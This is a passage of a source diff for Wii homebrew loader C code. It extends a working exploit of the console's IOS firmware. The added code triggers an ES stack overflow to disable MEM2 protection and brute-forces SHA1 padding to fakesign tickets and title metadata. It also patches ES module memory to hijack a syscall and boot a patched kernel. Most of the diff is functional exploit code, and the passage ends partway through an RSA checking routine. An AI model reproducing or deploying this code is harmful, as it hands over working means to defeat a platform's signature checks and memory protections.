@@ -1,6 +1,7 @@
 #include "haxx.h"
 #include "launcher.h"
 #include "wdvd.h"
+#include "sha1.h"
 
 #include <gccore.h>
 #include <wiiuse/wpad.h>
@@ -23,6 +24,8 @@ extern "C" {
 
 	extern u8 dipmodule_rawk_dat[];
 	extern u32 dipmodule_rawk_dat_size;
+
+	extern const u8 root_dat[];
 }
 
 #define dipmodule_dat dipmodule_rii_dat
@@ -38,17 +41,35 @@ int Haxx_Init()
 
 	if (!do_exploit())
 		return -1;
-	
+
 	usleep(4000);
 	if (load_module_code(filemodule_dat, filemodule_dat_size) < 0)
 		return -1;
-	
+
 	usleep(4000);
 	if (load_module_code(dipmodule_dat, dipmodule_dat_size) < 0)
 		return -1;
-	
+
 	usleep(4000);
-	
+#if 0
+	printf("Press home to exit\n");
+	while(1) {
+
+		// Call WPAD_ScanPads each loop, this reads the latest controller states
+		WPAD_ScanPads();
+
+		// WPAD_ButtonsDown tells us which buttons were pressed in this loop
+		// this is a "one shot" state which will not fire again until the button has been released
+		u32 pressed = WPAD_ButtonsDown(0)|WPAD_ButtonsDown(1);
+
+		// We return to the launcher application via exit
+		if ( pressed & WPAD_BUTTON_HOME ) exit(0);
+
+		// Wait for the next frame
+		VIDEO_WaitVSync();
+	}
+#endif
+
 	return 0;
 }
 
@@ -76,10 +97,14 @@ void Haxx_Mount(vector<int>* mounted)
 }
 
 extern "C" void udelay(int us);
+int check_cert_chain(const u8 *data, const u32 data_len);
 
 #define HASH_CHECK_ADDRESS  (void*)0x93A752C0
 #define ES_IOS_BOOT         (void*)0x939F02C8
 #define ES_STACK_EXPLOIT    (void*)0x2011142C
+#define ES_MODULE_START     ((u32*)0x939F0000)
+#define ES_MODULE_SIZE      0x20000
+#define SYSCALL_DEVICE_OPEN 0xE6000390
 
 #define MEM1_BASE           ((u32*)0x80000000)
 #define MEM1_BASE_UNCACHED  ((u32*)0xC0000000)
@@ -90,8 +115,8 @@ extern "C" void udelay(int us);
 #define HAX_IOS_VERSION     0x00250F1E
 
 // the filename used to load modules
-#define LOAD_MODULE_PATH    "/tmp/patch.bin"
-#define LOAD_KERNEL_PATH    "/tmp/boot.bin"
+static const char LOAD_MODULE_PATH[] = "/tmp/patch.bin";
+static const char LOAD_KERNEL_PATH[] = "/tmp/boot.bin";
 
 #define SYS_CERTS_SIZE      2560
 u8 sys_certs[2560] ATTRIBUTE_ALIGN(32);
@@ -224,32 +249,59 @@ static int do_patch(int i)
 	return 0;
 }
 
+u8 *fetch_file(const char *filename, u32 filesize)
+{
+	u8 *filebuf = NULL;
+	s32 fd = IOS_Open(filename, IPC_OPEN_READ);
+	if (fd>=0)
+	{
+		u32 real_size = IOS_Seek(fd, 0, SEEK_END);
+		if (!filesize)
+			filesize = real_size;
+		if (real_size >= filesize)
+		{
+			IOS_Seek(fd, SEEK_SET, 0);
+			filebuf = (u8*)memalign(32, filesize+32);
+			real_size = IOS_Read(fd, filebuf, filesize);
+			if (real_size < filesize)
+			{
+				free(filebuf);
+				filebuf = NULL;
+			}
+		}
+		IOS_Close(fd);
+	}
+	return filebuf;
+}
+
 static int get_certs()
 {
+	u32 readed;
 	s32 fd = IOS_Open("/sys/cert.sys", ISFS_OPEN_READ);
 	if (fd<0)
 		return 0;
 
-	if (IOS_Read(fd, sys_certs, SYS_CERTS_SIZE) != SYS_CERTS_SIZE)
-		return 0;
-
+	readed = IOS_Read(fd, sys_certs, SYS_CERTS_SIZE);
 	IOS_Close(fd);
-	return 1;
+
+	return (readed==SYS_CERTS_SIZE);
 }
 
 static const u16 ios_boot[] =
 {
-	0x68CE, // ldr r6, [r1,#0xc] 	// ipcmessage.vec
-	0x6830, // ldr r0, [r6]  		// vec[0].data (filename of kernel)
+	0x4804, // ldr r0, =kernel_name
 	0x2100, // movs r1, #0
-	0x4A01, // ldr r2, =0x00250F1E (new ios version, IOS37v3870)
-	0x4B01, // ldr r3, =0x2010A960+1 (es_syscall_ios_boot)
+	0x4A01, // ldr r2, =0x00250F1E
+	0x4B02, // ldr r3, os_ios_boot
 	0x4798, // blx r3
+	0x46C0,
 
-	(u16)(HAX_IOS_VERSION>>16), // ios_version
+	(u16)(HAX_IOS_VERSION>>16),
 	(u16)HAX_IOS_VERSION,
-	0x2010, // es_syscall_ios_boot
-	0xA960+1,
+	0x0000, // es_syscall_ios_boot
+	0x0000,
+	0x0000, // kernel_name
+	0x0000
 };
 
 static const u16 load_module[] =
@@ -277,6 +329,114 @@ static const u32 ios_ret[] =
 	0x20107084+1, // ret_address
 };
 
+void forge_sig(u8 *data, u32 length)
+{
+	const u8* fixed_hash;
+	u8 hash[20];
+	u32 payload_len = length - SIGNATURE_SIZE((u32*)data);
+	u8 *payload = data + length - payload_len;
+	u16 *payload_junk;
+	int i;
+	u32 j;
+
+	if (STD_SIGNED_TIK_SIZE == length)
+	{
+		payload_junk = (u16*)(data+0x262); // padding
+		fixed_hash = tik_hash;
+	}
+	else // TMD
+	{
+		payload_junk = (u16*)(data+0x1E2); // fill 3
+		fixed_hash = tmd_hash;
+	}
+
+	for (i=0; i < 65536; i++)
+	{
+		*payload_junk = i;
+		SHA1(payload, payload_len, hash);
+		if (hash[0]==0)
+		{
+			for (j=1; j < sizeof(hash); j++)
+			{
+				if (hash[j]==fixed_hash[j])
+				{
+					//printf("Fakesigned ok, junk %04X\n", i);
+					return;
+				}
+			}
+		}
+	}
+	printf("Fakesigning failed\n");
+}
+
+u8 *make_ticket(u64 title)
+{
+	u32 *ticket = (u32*)memalign(32, STD_SIGNED_TIK_SIZE);
+	if (ticket)
+	{
+		tik *fake_ticket;
+		memset(ticket, 0, STD_SIGNED_TIK_SIZE);
+		memcpy(ticket, tik_sig, sizeof(tik_sig));
+
+		fake_ticket = (tik*)(SIGNATURE_PAYLOAD(ticket));
+
+		strcpy(fake_ticket->issuer, "Root-CA00000001-XS00000003");
+		fake_ticket->ticketid = 0x0123456789ABCDEFllu;
+		fake_ticket->titleid = title;
+		fake_ticket->access_mask = 0xFFFF;
+		fake_ticket->reserved[0x3B] = 1;
+		memset(fake_ticket->cidx_mask, 0xFF, 32);
+
+		forge_sig((u8*)ticket, STD_SIGNED_TIK_SIZE);
+	}
+
+	return (u8*)ticket;
+}
+
+u8 *make_tmd(u64 title)
+{
+	u32 *TMD = (u32*)memalign(32, 0x208); // TMD with 1 content
+	if (TMD)
+	{
+		tmd *fake_tmd;
+		memset(TMD, 0, 0x208);
+		memcpy(TMD, tmd_sig, sizeof(tmd_sig));
+
+		fake_tmd = (tmd*)(SIGNATURE_PAYLOAD(TMD));
+
+		strcpy(fake_tmd->issuer, "Root-CA00000001-CP00000004");
+		fake_tmd->num_contents = 1;
+		fake_tmd->access_rights = -1;
+		fake_tmd->title_version = -1;
+		fake_tmd->title_id = title;
+		fake_tmd->sys_version = title;
+		fake_tmd->title_type = 1;
+		fake_tmd->group_id = 1;
+
+		forge_sig((u8*)TMD, SIGNED_TMD_SIZE(TMD));
+	}
+
+	return (u8*)TMD;
+}
+
+int check_for_sneek(s32 fd)
+{
+	u32 bversion;
+
+	if (ES_GetBoot2Version(&bversion)==0 && bversion >= 5)
+	{
+		printf("Smells like sneek...");
+		if (!IOS_Ioctlv(fd, 0x1F, 0, 0, NULL))
+		{
+			printf("Yep.\n");
+			return 1;
+		}
+		printf("Nope.\n");
+	}
+
+	return 0;
+}
+
 int disable_mem2_protection(s32 fd)
 {
 	u64 title = HAXX_IOS;
@@ -285,14 +445,75 @@ int disable_mem2_protection(s32 fd)
 	u8 lowmem_save[0x20];
 	s32 ret;
 
+	if (check_for_sneek(fd))
+	{
+		u8 *fake_tik;
+		u8 *fake_tmd;
+
+		if (!get_certs())
+		{
+			printf("Couldn't get certs\n");
+			return 0;
+		}
+
+		fake_tik = make_ticket(0x0000000100000001llu);
+		if (fake_tik==NULL)
+		{
+			printf("Couldn't make fake ticket\n");
+			return 0;
+		}
+		fake_tmd = make_tmd(0x0000000100000001llu);
+		if (fake_tmd==NULL)
+		{
+			free(fake_tik);
+			printf("Couldn't make fake TMD\n");
+			return 0;
+		}
+
+		ret = ES_Identify((signed_blob*)sys_certs, SYS_CERTS_SIZE, (signed_blob*)fake_tmd, SIGNED_TMD_SIZE((u32*)fake_tmd), (signed_blob*)fake_tik, SIGNED_TIK_SIZE((u32*)fake_tik), &cnt);
+
+		free(fake_tik);
+		free(fake_tmd);
+
+		if (ret==0)
+		{
+
+			if (!do_patch(MEM2_INDEX))
+			{
+				printf("Couldn't patch MEM2 protection\n");
+				return 0;
+			}
+			else
+			{
+				u8 *i;
+				const char ESVersion[] = "$IOSVersion: ES:";
+
+				for (i = (u8*)0x939F0000; i < (u8*)0x93B00000 - strlen(ESVersion); i++)
+				{
+					if (!memcmp(i, ESVersion, strlen(ESVersion)))
+					{
+						printf("Found: %.40s\n", i);
+						return 1;
+					}
+				}
+
+			}
+		}
+
+		return 0;
+	}
+
 	vec[0].data = &title;
 	vec[0].len = sizeof(title);
 	vec[1].data = &cnt;
 	vec[1].len = sizeof(cnt);
+	// do this myself because libogc fails
+	DCFlushRange(&title, 4);
+	DCFlushRange(((u8*)&title)+4, 4);
 	ret = IOS_Ioctlv(fd, 0x12, 1, 1, vec); // ES_GetNumTicketViews
 	if (ret)
 	{
-		printf("Couldn't get NumTicketViews\n");
+		printf("Couldn't get NumTicketViews (%d)\n", ret);
 		return 0;
 	}
 	if (cnt != 1)
@@ -305,7 +526,7 @@ int disable_mem2_protection(s32 fd)
 	memcpy(lowmem_save, MEM1_BASE, sizeof(lowmem_save));
 	memcpy(MEM1_BASE_UNCACHED, ios_ret, sizeof(ios_ret));
 
-	vec[2].data = ES_STACK_EXPLOIT; // somewhere in ES's stack. This value works but was guessed, I have no idea what it's trashing.
+	vec[2].data = ES_STACK_EXPLOIT;
 	vec[2].len = 0x0;
 	cnt = 0x20000000; // 0x20000000 * 0xD8 = 0x1B00000000 = 0
 	ret = IOS_Ioctlv(fd, 0x13, 2, 1, vec); // ES_GetTicketViews
@@ -315,7 +536,7 @@ int disable_mem2_protection(s32 fd)
 
 	if (ret != 101) // exploit failed
 	{
-		printf("Possible incorrect ES version, failed\n");
+		printf("Possible incorrect ES version, failed (%d)\n", ret);
 		return 0;
 	}
 
@@ -328,11 +549,10 @@ int disable_mem2_protection(s32 fd)
 	return 1;
 }
 
-// this function will only work once after reloading IOS, so use sparingly
+// this function will only work once after reloading IOS, so use sparingly. Make sure ES has been patched before calling!
 static int identify_as_title(u64 title)
 {
-	s32 fd;
-	s32 size;
+	s32 ret;
 	u32 *tmd_blob = NULL;
 	tmd *title_tmd;
 	u32 *tik_blob = NULL;
@@ -343,49 +563,30 @@ static int identify_as_title(u64 title)
 		return 0;
 
 	sprintf(filename, "/title/%08x/%08x/content/title.tmd", (u32)(title>>32), (u32)title);
-	fd = IOS_Open(filename, 1);
-	if (fd<0)
-		return 0;
-
-	size = IOS_Seek(fd, 0, SEEK_END);
-
-	tmd_blob = (u32*)memalign(32, size+32);
+	tmd_blob = (u32*)fetch_file(filename, 0);
 	if (tmd_blob==NULL)
 		return 0;
-	IOS_Seek(fd, 0, 0);
-	IOS_Read(fd, tmd_blob, size);
-
 	title_tmd = (tmd*)SIGNATURE_PAYLOAD(tmd_blob);
-	IOS_Close(fd);
 
 	sprintf(filename, "/ticket/%08x/%08x.tik", (u32)(title>>32), (u32)title);
-	fd = IOS_Open(filename, 1);
-	if (fd >= 0)
+	tik_blob = (u32*)fetch_file(filename, 0);
+	if (tik_blob==NULL)
 	{
-		size = IOS_Seek(fd, 0, SEEK_END);
-		tik_blob = (u32*)memalign(32, size+32);
+		// Disc based games don't have a stored ticket
+		tik_blob = (u32*)make_ticket(title);
 		if (tik_blob==NULL)
 		{
-			IOS_Close(fd);
 			free(tmd_blob);
 			return 0;
 		}
-		IOS_Seek(fd, 0, 0);
-		IOS_Read(fd, tik_blob, size);
-		IOS_Close(fd);
-	}
-	else
-	{
-		free(tmd_blob);
-		return 0;
 	}
 
-	fd = ES_Identify((signed_blob*)sys_certs, SYS_CERTS_SIZE, (signed_blob*)tmd_blob, SIGNED_TMD_SIZE(tmd_blob), (signed_blob*)tik_blob, SIGNED_TIK_SIZE(tik_blob), &junk);
+	ret = ES_Identify((signed_blob*)sys_certs, SYS_CERTS_SIZE, (signed_blob*)tmd_blob, SIGNED_TMD_SIZE(tmd_blob), (signed_blob*)tik_blob, SIGNED_TIK_SIZE(tik_blob), &junk);
 
 	free(tmd_blob);
 	free(tik_blob);
 
-	return !fd;
+	return !ret;
 }
 
 static int patch_mem2(void* buf, s32 size)
@@ -428,68 +629,122 @@ static int patch_ios37_sd_load(void* buf, s32 size)
 	return count;
 }
 
+static u8 *load_tmd_content(tmd* title_tmd, u16 index)
+{
+	u8 *content = NULL;
+	s32 fd;
+	char filename[65];
+	u32 j;
+	u32 size=0;
+
+	fd = IOS_Open("/shared1/content.map", ISFS_OPEN_READ);
+	if (fd>=0)
+	{
+		size = IOS_Seek(fd, 0, SEEK_END);
+		IOS_Close(fd);
+	}
+
+	if (size>0)
+	{
+		u8 *content_map;
+		u32 content_map_entries=0;
+
+		content_map = fetch_file("/shared1/content.map", size);
+		if (content_map)
+		{
+			content_map_entries = size / sizeof(cmap_entry);
+			if (title_tmd->contents[index].type & 0x8000)
+			{
+				// shared
+				filename[0] = 0;
+				for (j=0; j < content_map_entries; j++)
+				{
+					cmap_entry *shared = (cmap_entry*)(content_map+j*sizeof(cmap_entry));
+					if (!memcmp(shared->hash, title_tmd->contents[index].hash, sizeof(sha1)))
+					{
+						strcpy(filename, "/shared1/00000000.app");
+						memcpy(filename+9, shared->name, 8);
+						break;
+					}
+				}
+			}
+			else
+				sprintf(filename, "/title/%08x/%08x/content/%08x.app", (u32)(title_tmd->title_id>>32), (u32)(title_tmd->title_id), title_tmd->contents[index].cid);
+
+			free(content_map);
+
+			size = title_tmd->contents[index].size;
+			content = fetch_file(filename, size);
+
+			if (content)
+			{
+				u8 real_hash[20];
+				SHA1(content, size, real_hash);
+				if (memcmp(title_tmd->contents[index].hash, real_hash, sizeof(sha1)))
+				{
+					printf("Content file %s had bad hash\n", filename);
+					free(content);
+					content = NULL;
+				}
+			}
+			else
+				printf("Couldn't fetch content %s\n", filename);
+		}
+	}
+
+	return content;
+}
+
 static int prepare_new_kernel(u64 title)
 {
 	s32 fd;
-	s32 size, readed;
+	s32 size=0, readed;
 	u32 *tmd_blob = NULL;
 	tmd *title_tmd;
 	char filename[65];
-	void *kernel_blob;
+	void *kernel_blob = NULL;
+	int i;
 
 	sprintf(filename, "/title/%08x/%08x/content/title.tmd", (u32)(title>>32), (u32)title);
-	fd = IOS_Open(filename, 1);
-	if (fd<0)
-	{
-		printf("Couldn't open TMD\n");
-		return 0;
-	}
-
-	size = IOS_Seek(fd, 0, SEEK_END);
-
-	tmd_blob = (u32*)memalign(32, size+32);
+	tmd_blob = (u32*)fetch_file(filename, 0);
 	if (tmd_blob==NULL)
 	{
 		printf("Couldn't allocate TMD blob\n");
 		return 0;
 	}
-	IOS_Seek(fd, 0, 0);
-	readed = IOS_Read(fd, tmd_blob, size);
-	IOS_Close(fd);
-	if (readed != size)
-	{
-		printf("Couldn't read TMD\n");
-		free(tmd_blob);
-		return 0;
-	}
-
 	title_tmd = (tmd*)SIGNATURE_PAYLOAD(tmd_blob);
 
-	fd = ES_OpenContent(title_tmd->boot_index);
-	free(tmd_blob);
-	if (fd<0)
+	if (check_cert_chain((u8*)tmd_blob, SIGNED_TMD_SIZE(tmd_blob)))
 	{
-		printf("Couldn't read boot index content\n");
+		free(tmd_blob);
+		printf("IOS %d TMD failed sig check\n", (u32)title);
 		return 0;
 	}
 
-	size = ES_SeekContent(fd, 0, SEEK_END);
-	ES_SeekContent(fd, 0, 0);
+	for (i=0; i < title_tmd->num_contents; i++)
+	{
+		// check SHA1 hash of each content against the TMD
+		u8 *blob = load_tmd_content(title_tmd, i);
+		if (blob==NULL)
+		{
+			printf("Couldn't load IOS content %d\n", i);
+			free(tmd_blob);
+			return 0;
+		}
+		if (title_tmd->contents[i].index == title_tmd->boot_index)
+		{
+			size = title_tmd->contents[i].size;
+			kernel_blob = blob;
+		}
+		else
+			free(blob);
+	}
 
-	kernel_blob = memalign(32, size+32);
+	free(tmd_blob);
+
 	if (kernel_blob==NULL)
 	{
-		printf("Couldn't allocate kernel blob\n");
-		ES_CloseContent(fd);
-		return 0;
-	}
-
-	readed = ES_ReadContent(fd, (u8*)kernel_blob, size);
-	ES_CloseContent(fd);
-	if (readed != size)
-	{
-		printf("Couldn't read kernel content\n");
-		free(kernel_blob);
+		printf("Couldn't fetch new kernel\n");
 		return 0;
 	}
 
@@ -535,13 +790,31 @@ static void shutdown_for_reload()
 static void load_patched_ios(s32 fd, const char* filename)
 {
 	ioctlv vec;
-	// the data being copied over doesn't matter since we're loading
-	// a new IOS
-	memcpy(ES_IOS_BOOT, ios_boot, sizeof(ios_boot));
-	DCFlushRange((void*)((u32)ES_IOS_BOOT&~0x1F), 32);
-	vec.data = (void*)filename;
-	vec.len = strlen(filename)+1;
-	IOS_IoctlvRebootBackground(fd, 0x1F, 1, 0, &vec);
+	u32* addr;
+	for (addr=(u32*)ES_MODULE_START;addr < (u32*)(ES_MODULE_START+ES_MODULE_SIZE);addr++)
+	{
+		if (*addr == SYSCALL_DEVICE_OPEN)
+		{
+			u32 junk;
+			//printf("Found ES_SYSCALL_DEVICE_OPEN at %p\n", addr);
+			memcpy(MEM1_BASE_UNCACHED, ios_boot, sizeof(ios_boot));
+			MEM1_BASE_UNCACHED[4] = (u32)addr + 0x130 - 0x939F0000 + 0x20100000;
+			MEM1_BASE_UNCACHED[5] = (u32)filename & 0x7FFFFFFF;
+			DCFlushRange((void*)filename, strlen(filename+1));
+			//printf("%08X %08X\n", MEM1_BASE_UNCACHED[4], MEM1_BASE_UNCACHED[5]);
+
+			addr[0] = 0xE3A02001; // mov r2, #1
+			addr[1] = 0xE12FFF12; // bx r2
+			DCFlushRange(addr, 8);
+			vec.data = &junk;
+			vec.len = sizeof(junk);
+			//printf("Taking the plunge...\n");
+			//printf("IOS returned %d\n", IOS_Ioctlv(fd, 0x0c, 0, 1, &vec));
+			//printf("Owned titles: %d\n", junk);
+			IOS_IoctlvRebootBackground(fd, 0x0C, 0, 1, &vec);
+			return;
+		}
+	}
 }
 
 static int load_module_file(s32 fd, const char *filename)
@@ -579,12 +852,12 @@ static void recover_from_reload(s32 version)
 	{
 		newversion = IOS_GetVersion();
 		if (newversion != version)
-			udelay(1000);
+			udelay(6000);
 		else
 			break;
 	}
 
-	// Wait for new IOS to signal IPC is ready
+	// Catch erroneous IPC signal
 	for (retries = 0; retries < 10; retries++)
 	{
 		if(IPC_ReadReg(1) & 2)
@@ -634,179 +907,60 @@ static int load_module_code(void *module_code, s32 module_size)
 	return fd;
 }
 
-static int load_sdhc_module(s32 es_fd)
+static int load_sdhc_module(u64 title_ios)
 {
-	s32 fd;
-	s32 size, readed;
+	s32 ret=0;
+	s32 size;
 	u32 *tmd_blob = NULL;
 	tmd *title_tmd;
-	u8 *tik_blob;
 	char filename[65];
-	u64 title = 0x0000000100000038llu; // IOS56
 	u8 *module_buf = NULL;
-	u32 i, j;
+	int i, found=0;
+	u32 j;
 
-	sprintf(filename, "/title/%08x/%08x/content/title.tmd", (u32)(title>>32), (u32)title);
-	fd = IOS_Open(filename, 1);
-	if (fd<0)
-	{
-		printf("Couldn't open TMD for SDHC\n");
-		return 0;
-	}
+	//printf("Attempting to load SDHC module from IOS %d\n", (u32)title_ios);
 
-	size = IOS_Seek(fd, 0, SEEK_END);
-
-	tmd_blob = (u32*)memalign(32, size+32);
+	sprintf(filename, "/title/%08x/%08x/content/title.tmd", (u32)(title_ios>>32), (u32)title_ios);
+	tmd_blob = (u32*)fetch_file(filename, 0);
 	if (tmd_blob==NULL)
 	{
-		printf("Couldn't allocate TMD blob for SDHC\n");
+		//printf("Couldn't get TMD blob for SDHC\n");
 		return 0;
 	}
-	IOS_Seek(fd, 0, 0);
-	readed = IOS_Read(fd, tmd_blob, size);
-	IOS_Close(fd);
-	if (readed != size)
-	{
-		printf("Couldn't read TMD\n");
-		free(tmd_blob);
-		return 0;
-	}
-
 	title_tmd = (tmd*)SIGNATURE_PAYLOAD(tmd_blob);
 
-	sprintf(filename, "/ticket/%08x/%08x.tik", (u32)(title>>32), (u32)title);
-	fd = IOS_Open(filename, 1);
-	if (fd >= 0)
-	{
-		size = IOS_Seek(fd, 0, SEEK_END);
-		tik_blob = (u8*)memalign(32, size+32);
-		if (tik_blob==NULL)
-		{
-			IOS_Close(fd);
-			free(tmd_blob);
-			return 0;
-		}
-		IOS_Seek(fd, 0, 0);
-		readed = IOS_Read(fd, tik_blob, size);
-		IOS_Close(fd);
-		if (readed != size)
-		{
-			free(tmd_blob);
-			free(tik_blob);
-			return 0;
-		}
-	}
-	else
+	if (check_cert_chain((u8*)tmd_blob, SIGNED_TMD_SIZE(tmd_blob)))
 	{
 		free(tmd_blob);
+		printf("IOS %d TMD failed sig check\n", (u32)title_ios);
 		return 0;
 	}
 
-	// check signature
-	free(tik_blob);
-
-	fd = IOS_Open("/shared1/content.map", ISFS_OPEN_READ);
-	if (fd>=0)
+	for (i=0; i < title_tmd->num_contents && !found; i++)
 	{
-		u8 *content_map;
-		u32 content_map_entries=0;
-
-		size = IOS_Seek(fd, 0, SEEK_END);
-		IOS_Seek(fd, 0, 0);
-		content_map = (u8*)memalign(32, size+32);
-		if (content_map==NULL)
+		free(module_buf); // lazy
+		module_buf = load_tmd_content(title_tmd, i);
+		size = title_tmd->contents[i].size;
+		if (module_buf)
 		{
-			free(tmd_blob);
-			IOS_Close(fd);
-			return 0;
-		}
-		readed = IOS_Read(fd, content_map, size);
-		IOS_Close(fd);
-		if (readed != size)
-		{
-			free(content_map);
-			free(tmd_blob);
-			return 0;
-		}
-		content_map_entries = size / sizeof(cmap_entry);
-
-		for (i=0; i < title_tmd->num_contents; i++)
-		{
-			int found=0;
-			s32 content_fd;
-			if (title_tmd->contents[i].type & 0x8000)
+			const char sd_version[] = "$IOSVersion: SDI:";
+			for (j=0; j < size - strlen(sd_version); j++)
 			{
-				// shared
-				filename[0] = 0;
-				for (j=0; j < content_map_entries; j++)
+				if (!memcmp(module_buf + j, sd_version, strlen(sd_version)))
 				{
-					cmap_entry *shared = (cmap_entry*)(content_map+j*sizeof(cmap_entry));
-					if (!memcmp(shared->hash, title_tmd->contents[i].hash, sizeof(sha1)))
-					{
-						strcpy(filename, "/shared1/");
-						strncat(filename, shared->name, 8);
-						strcat(filename, ".app");
-						break;
-					}
+					found = 1;
+					break;
 				}
 			}
-			else
-				sprintf(filename, "/title/%08x/%08x/%08x.app", (u32)(title>>32), (u32)title, title_tmd->contents[i].cid);
-
-			content_fd = IOS_Open(filename, ISFS_OPEN_READ);
-			if (content_fd<0)
-				continue;
-			size = IOS_Seek(content_fd, 0, SEEK_END);
-			if (size<=0)
-			{
-				IOS_Close(content_fd);
-				continue;
-			}
-			IOS_Seek(content_fd, 0, 0);
-
-			module_buf = (u8*)memalign(32, size+32);
-			if (module_buf==NULL)
-			{
-				IOS_Close(content_fd);
-				continue;
-			}
-			readed = IOS_Read(content_fd, module_buf, size);
-			IOS_Close(content_fd);
-
-			if (readed == size)
-			{
-				char sd_version[] = "$IOSVersion: SDI:";
-				for (j=0; j < size - sizeof(sd_version)-1; j++)
-				{
-					if (!memcmp(module_buf + j, sd_version, sizeof(sd_version)-1))
-					{
-						found = 1;
-						break;
-					}
-				}
-			}
-
-			if (found)
-				break;
-
-			free(module_buf);
-			module_buf = NULL;
 		}
-
-		free(content_map);
 	}
+
+	if (found)
+		ret = load_module_code(module_buf, size);
 
 	free(tmd_blob);
-
-	if (module_buf==NULL)
-	{
-		printf("Couldn't find IOS56 SD Module\n");
-		return 0;
-	}
-
-	fd = load_module_code(module_buf, size);
 	free(module_buf);
-	return fd;
+	return ret;
 }
 
 static int do_sig_check_patch()
@@ -825,9 +979,11 @@ static bool do_exploit()
 	s32 es_fd = -1;
 	const u64 ios_title = HAXX_IOS;
 
-	if (IOS_GetVersion() != 37 || IOS_GetRevision() != HAXX_IOS_VERSION)
+	printf("Grabbin' HAXX\n");
+
+	if (IOS_GetVersion() != (u32)HAXX_IOS || IOS_GetRevision() != HAXX_IOS_VERSION)
 	{
-		printf("Wrong IOS version. Update IOS37 to the latest version.\n");
+		printf("Wrong IOS version. Update IOS%d to the latest version.\n", (u32)HAXX_IOS);
 		return false;
 	}
 
@@ -843,26 +999,17 @@ static bool do_exploit()
 		int patch_failed = 0;
 		printf("MEM2 protection disabled\n");
 
-		// make sure signature check isn't patched
-		*(u16*)0x93A752E6 = 0x2007;
-		DCFlushRange((void*)0x93A752E0, 32);
+		if (!check_for_sneek(es_fd))
+		{
+			// make sure signature check isn't patched
+			*(u16*)0x93A752E6 = 0x2007;
+			DCFlushRange((void*)0x93A752E0, 32);
 
-		if (!do_patch(DI_VERIFY_INDEX))
-		{
-			patch_failed = 1;
-			printf("DI Verify patch failed\n");
-		}
-		if (!do_patch(NAND_PERMS_INDEX))
-		{
-			patch_failed = 1;
-			printf("NAND Permissions patch failed\n");
-		}
-
-		if (!patch_failed)
-		{
-			patch_failed = !identify_as_title(ios_title);
-			if (patch_failed)
-				printf("Failed to identify as title %08x%08x\n", (u32)(ios_title>>32), (u32)ios_title);
+			if (!do_patch(NAND_PERMS_INDEX))
+			{
+				patch_failed = 1;
+				printf("NAND Permissions patch failed\n");
+			}
 		}
 
 		if (!patch_failed)
@@ -877,7 +1024,7 @@ static bool do_exploit()
 			shutdown_for_reload();
 			load_patched_ios(es_fd, LOAD_KERNEL_PATH);
 			es_fd = 0;
-			recover_from_reload(HAX_IOS_VERSION);
+			recover_from_reload(HAX_IOS_VERSION>>16);
 			if (IOS_GetVersion() != (HAX_IOS_VERSION>>16) || IOS_GetRevision() != (HAX_IOS_VERSION&0xFFFF))
 				patch_failed = 1;
 		}
@@ -887,10 +1034,13 @@ static bool do_exploit()
 
 		if (!patch_failed)
 		{
-			patch_failed = 1;
-			es_fd = IOS_Open("/dev/es", 0);
-			if (es_fd>=0)
-				patch_failed = !load_sdhc_module(es_fd);
+			patch_failed = !(load_sdhc_module(0x0000000100000038llu) || load_sdhc_module(0x000000010000003Cllu) || \
+				load_sdhc_module(0x000000010000003Dllu) || load_sdhc_module(0x0000000100000046llu));
+			if (patch_failed)
+			{
+				printf("SDHC module couldn't be loaded, trying IOS37 standard SD.\n");
+				patch_failed = !load_sdhc_module(0x0000000100000025llu);
+			}
 		}
 
 		if (!patch_failed)
@@ -905,3 +1055,268 @@ static bool do_exploit()
 
 	return true;
 }
+
+/******* BEGIN SIGNATURE CHECKING STUF ******/
+static u32 be32(const u8 *p)
+{
+	return (p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3];
+}
+
+static void bn_zero(u8 *d, const u32 n)
+{
+	memset(d, 0, n);
+}
+
+static void bn_copy(u8 *d, const u8 *a, const u32 n)
+{
+	memcpy(d, a, n);
+}
+
+static int bn_compare(const u8 *a, const u8 *b, const u32 n)
+{
+	u32 i;
+
+	for (i = 0; i < n; i++) {
+		if (a[i] < b[i])
+			return -1;
+		if (a[i] > b[i])
+			return 1;
+	}
+
+	return 0;
+}
+
+static void bn_sub_modulus(u8 *a, const u8 *N, const u32 n)
+{
+	u32 i;
+	u32 dig;
+	u8 c;
+
+	c = 0;
+	for (i = n - 1; i < n; i--) {
+		dig = N[i] + c;
+		c = (a[i] < dig);
+		a[i] -= dig;
+	}
+}
+
+static void bn_add(u8 *d, const u8 *a, const u8 *b, const u8 *N, const u32 n)
+{
+	u32 i;
+	u32 dig;
+	u8 c;
+
+	c = 0;
+	for (i = n - 1; i < n; i--) {
+		dig = a[i] + b[i] + c;
+		c = (dig >= 0x100);
+		d[i] = dig;
+	}
+
+	if (c)
+		bn_sub_modulus(d, N, n);
+
+	if (bn_compare(d, N, n) >= 0)
+		bn_sub_modulus(d, N, n);
+}
+
+static void bn_mul(u8 *d, const u8 *a, const u8 *b, const u8 *N, const u32 n)
+{
+	u32 i;
+	u8 mask;
+
+	bn_zero(d, n);
+
+	for (i = 0; i < n; i++)
+		for (mask = 0x80; mask != 0; mask >>= 1) {
+			bn_add(d, d, d, N, n);
+			if ((a[i] & mask) != 0)
+				bn_add(d, d, b, N, n);
+		}
+}
+
+static void bn_exp(u8 *d, const u8 *a, const u8 *N, const u32 n, const u8 *e, const u32 en)
+{
+	u8 t[512];
+	u32 i;
+	u8 mask;
+
+	bn_zero(d, n);
+	d[n-1] = 1;
+	for (i = 0; i < en; i++)
+		for (mask = 0x80; mask != 0; mask >>= 1) {
+			bn_mul(t, d, d, N, n);
+			if ((e[i] & mask) != 0)
+				bn_mul(d, t, a, N, n);
+			else
+				bn_copy(d, t, n);
+		}
+}
+
+static u32 get_sig_len(const u8 *sig)
+{
+	u32 type;
+
+	type = be32(sig);
+	switch (type - 0x10000) {
+	case 0:
+		return 0x240;
+
+	case 1:
+		return 0x140;
+
+	case 2:
+		return 0x80;
+	}
+
+	return 0;
+}
+
+static u32 get_sub_len(const u8 *sub)
+{
+	u32 type;
+	type = be32(sub + 0x40);
+	switch (type) {
+	case 0:
+		return 0x2c0;
+
+	case 1:
+		return 0x1c0;
+
+	case 2:
+		return 0x100;
+	}
+
+	return 0;
+}
+
+static int check_rsa(const u8 *h, const u8 *sig, const u8 *key, const u32 n)
+{
+	u8 correct[0x200], x[0x200];
+	static const u8 ber[16] = {0x00,0x30,0x21,0x30,0x09,0x06,0x05,0x2b,
+		0x0e,0x03,0x02,0x1a,0x05,0x00,0x04,0x14};
+
+	correct[0] = 0;
+	correct[1] = 1;
